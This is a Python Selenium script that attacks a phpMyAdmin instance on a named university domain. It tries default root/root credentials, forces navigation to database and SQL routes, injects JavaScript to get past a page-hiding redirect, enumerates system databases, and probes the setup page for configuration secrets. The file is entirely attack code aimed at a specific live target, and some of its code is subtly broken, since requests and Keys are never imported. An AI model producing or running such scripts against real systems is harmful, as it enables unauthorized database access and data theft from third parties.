#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time, re

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access phpMyAdmin and try to navigate through the language selection
    print("=== NAVEGANDO POR phpMyAdmin ===\n")
    
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
    time.sleep(3)
    
    # The page shows language dropdown - try selecting a language
    # This might trigger the JavaScript redirect
    try:
        # Find the language dropdown
        lang_select = driver.find_element(By.ID, 'select_lang')
        lang_select.click()
        time.sleep(2)
        
        # Select English
        eng_option = driver.find_element(By.XPATH, '//option[@value="en"]')
        eng_option.click()
        time.sleep(5)
        
        tc = driver.page_source
        tc_clean = re.sub(r'<[^>]+>', ' ', tc)
        tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
        print(f"After lang select: len={len(tc_clean)}")
        print(f"Content: {tc_clean[:500]}")
        
    except Exception as e:
        print(f"Language select error: {e}")
    
    # Try to access the database by clicking on the language
    print("\n=== INTENTANDO ACCESO DIRECTO ===\n")
    
    # Try to navigate to the database page using JavaScript
    try:
        driver.execute_script("window.location.href = 'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=mysql';")
        time.sleep(5)
        
        tc2 = driver.page_source
        tc2_clean = re.sub(r'<[^>]+>', ' ', tc2)
        tc2_clean = re.sub(r'\s+', ' ', tc2_clean).strip()
        print(f"Direct navigation: len={len(tc2_clean)}")
        print(f"Content: {tc2_clean[:500]}")
        
    except Exception as e:
        print(f"Navigation error: {e}")
    
    # Try to use the PMA cookie from a previous session
    print("\n=== COOKIES ===\n")
    try:
        # Get the PMA cookie
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        r = s.post('https://orcl.uns.edu.pe/index.php',
                         data={'pma_username': 'root', 'pma_password': 'root', 'server': '1'},
                         timeout=5)
        cookies = dict(s.cookies)
        print(f"Cookies: {cookies}")
        
        # Try to access with cookies
        r2 = s.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data',
                        cookies=cookies, timeout=5)
        tc_r2 = re.sub(r'<[^>]+>', ' ', r2.text)
        tc_r2_clean = re.sub(r'\s+', ' ', tc_r2).strip()
        print(f"With cookies: len={len(tc_r2_clean)}")
        
    except Exception as e:
        print(f"Cookies error: {e}")
    
    # Try to access phpMyAdmin through the main page
    print("\n=== PAGINA PRINCIPAL ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php')
        time.sleep(3)
        
        # Find and click the "Iniciar sesión" button
        login_links = driver.find_elements(By.LINK_TEXT, 'Iniciar sesión')
        for link in login_links:
            link.click()
            time.sleep(3)
            
            tc = driver.page_source
            tc_clean = re.sub(r'<[^>]+>', ' ', tc)
            tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
            print(f"Login page: len={len(tc_clean)}")
            
            # Try to fill the form
            try:
                user_input = driver.find_element(By.NAME, 'pma_username')
                user_input.clear()
                user_input.send_keys('root')
                
                pass_input = driver.find_element(By.NAME, 'pma_password')
                pass_input.clear()
                pass_input.send_keys('root')
                
                pass_input.send_keys(Keys.RETURN)
                time.sleep(5)
                
                tc2 = driver.page_source
                tc2_clean = re.sub(r'<[^>]+>', ' ', tc2)
                tc2_clean = re.sub(r'\s+', ' ', tc2_clean).strip()
                print(f"After login: len={len(tc2_clean)}")
                print(f"Content: {tc2_clean[:500]}")
            except:
                pass
        
    except Exception as e:
        print(f"Main page error: {e}")
    
    # Try to access the database through the server status
    print("\n=== SERVER STATUS ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/status')
        time.sleep(3)
        
        # Execute JavaScript to bypass the redirect
        driver.execute_script("document.documentElement.style.display = 'block';")
        time.sleep(2)
        
        # Also try to click on any buttons
        buttons = driver.find_elements(By.TAG_NAME, 'button')
        for btn in buttons[:5]:
            btn.click()
            time.sleep(2)
        
        tc = driver.page_source
        tc_clean = re.sub(r'<[^>]+>', ' ', tc)
        tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
        print(f"Status: len={len(tc_clean)}")
        
    except Exception as e:
        print(f"Status error: {e}")
    
    # Try to access the database through the server variables
    print("\n=== SERVER VARIABLES ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
        time.sleep(3)
        
        driver.execute_script("document.documentElement.style.display = 'block';")
        time.sleep(2)
        
        tc = driver.page_source
        tc_clean = re.sub(r'<[^>]+>', ' ', tc)
        tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
        print(f"Variables: len={len(tc_clean)}")
        if len(tc_clean) > 5000:
            print("[!] Variables accessible!")
            version_info = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_clean, re.IGNORECASE)
            print(f"  Version: {version_info[:10]}")
        
    except Exception as e:
        print(f"Variables error: {e}")
    
    # Try to use JavaScript to directly access the database data
    print("\n=== JS DIRECTO A BD ===\n")
    try:
        # Use JavaScript to make an XHR request to get database data
        js = """
        var x = new XMLHttpRequest();
        x.open('GET', 'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&ajax_request=true', false);
        x.send();
        document.title = x.responseText.substring(0, 500);
        """
        driver.execute_script(js)
        time.sleep(5)
        
        title = driver.title
        print(f"Response title: {title[:500]}")
        
    except Exception as e:
        print(f"JS direct error: {e}")
    
    # Try to access phpMyAdmin through different URL patterns
    print("\n=== PATRONES URL ===\n")
    try:
        url_patterns = [
            'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=mysql',
            'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=information_schema',
            'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=phpmyadmin',
            'https://orcl.uns.edu.pe/index.php?route=/server/sql',
            'https://orcl.uns.edu.pe/index.php?route=/server/status/variables',
        ]
        
        for url in url_patterns:
            driver.get(url)
            time.sleep(3)
            driver.execute_script("document.documentElement.style.display = 'block';")
            time.sleep(2)
            
            tc = driver.page_source
            tc_clean = re.sub(r'<[^>]+>', ' ', tc)
            tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
            
            if len(tc_clean) > 2000:
                print(f"[!] Different content: {url.split('=')[-1]}")
                print(f"  Length: {len(tc_clean)}")
                if 'mysql' in tc_clean.lower() or 'Database' in tc_clean:
                    print(f"  [!] Database content!")
                    # Look for table names
                    td_elements = driver.find_elements(By.TAG_NAME, 'td')
                    td_text = [t.text.strip() for t in td_elements if t.text.strip()]
                    print(f"  Tables: {td_text[:10]}")
                break
        
    except Exception as e:
        print(f"URL pattern error: {e}")
    
    # Try to access the phpMyAdmin setup page
    print("\n=== SETUP PAGE ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/setup/index.php')
        time.sleep(3)
        
        tc_setup = driver.page_source
        tc_setup_clean = re.sub(r'<[^>]+>', ' ', tc_setup)
        tc_setup_clean = re.sub(r'\s+', ' ', tc_setup_clean).strip()
        print(f"Setup: len={len(tc_setup_clean)}")
        
        # Look for configuration data
        if 'blowfish' in tc_setup_clean.lower():
            print("[!] Blowfish in setup!")
        
        # Look for the config file path
        config_refs = re.findall(r'config[^<]*', tc_setup_clean, re.IGNORECASE)
        print(f"  Config refs: {config_refs[:5]}")
        
        # Try to find the config file
        # Look for any links to the config file
        config_links = driver.find_elements(By.XPATH, '//a[contains(@href, "config") or contains(@href, "setup")]')
        for cl in config_links:
            print(f"  Config link: {cl.text.strip()} -> {cl.get_attribute('href')}")
        
    except Exception as e:
        print(f"Setup error: {e}")
    
    # Final attempt: try to use JavaScript to bypass the JS redirect
    print("\n=== ÚLTIMO INTENTO: JS BYPASS ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data')
        time.sleep(3)
        
        # Execute JavaScript to bypass the redirect
        # The page has: html{display:none;} html{display:block}
        # This is controlled by JavaScript that sets document.documentElement.style.display
        # We can try to execute the JavaScript that the page uses
        
        js_bypass = """
        // Try to execute the PMA initialization
        if (typeof PMA !== 'undefined') {
            PMA.initialize();
        }
        // Try to show the content
        document.documentElement.style.display = 'block';
        document.body.style.display = 'block';
        // Try to navigate to the database page
        window.location.href = window.location.href;
        """
        driver.execute_script(js_bypass)
        time.sleep(5)
        
        tc_final = driver.page_source
        tc_final_clean = re.sub(r'<[^>]+>', ' ', tc_final)
        tc_final_clean = re.sub(r'\s+', ' ', tc_final_clean).strip()
        print(f"Final: len={len(tc_final_clean)}")
        
        if len(tc_final_clean) > 2000 and 'mysql' in tc_final_clean.lower():
            print("[!] Database content found!")
            # Look for database names
            db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin)[^<,"]*', tc_final_clean, re.IGNORECASE)
            print(f"  Databases: {db_names}")
        
    except Exception as e:
        print(f"JS bypass error: {e}")
    
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_attempt.png')
    
finally:
    driver.quit()

print("\n=== FIN ===")
